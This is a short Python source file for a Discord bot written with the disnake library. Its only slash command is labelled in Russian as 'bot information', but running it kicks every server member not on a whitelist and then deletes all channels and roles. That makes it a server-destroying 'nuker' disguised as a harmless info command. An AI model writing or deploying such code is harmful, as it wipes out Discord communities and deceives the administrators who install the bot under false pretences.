import disnake
from disnake.ext import commands
import asyncio

import config

bot = commands.InteractionBot(intents=disnake.Intents.all())

@bot.event
async def on_ready() -> None:
    print(message := f'Auth success. Name: {bot.user}; ID: {bot.user.id}')
    print('=' * len(message))

@bot.slash_command(description='Информация о боте')
async def bot_info(ctx) -> None:
    members, channels, roles = ctx.guild.members, ctx.guild.channels, ctx.guild.roles
    except_time = (len(members) * 0.3) + (len(channels) * 0.3) + (len(roles) * 0.3)
    print(f'{except_time=}')
    
    for member in members:
        try:
            if member.id not in config.dont_kick_them:
                await member.kick()
        except Exception as ex:
            print(f'Failed to kick {member.name}. Error: {ex}')
        finally:
            await asyncio.sleep(0.3)

    for channel in channels:
        try:
            await channel.delete()
        except Exception as ex:
            print(f'Failed delete {channel.name}. Error: {ex}')
        finally:
            await asyncio.sleep(0.3)
    
    for role in roles:
        try:
            await role.delete()
        except Exception as ex:
            print(f'Failed delete {role.name}. Error: {ex}')
        finally:
            await asyncio.sleep(0.3)

if __name__ == '__main__':
    bot.run(config.token)
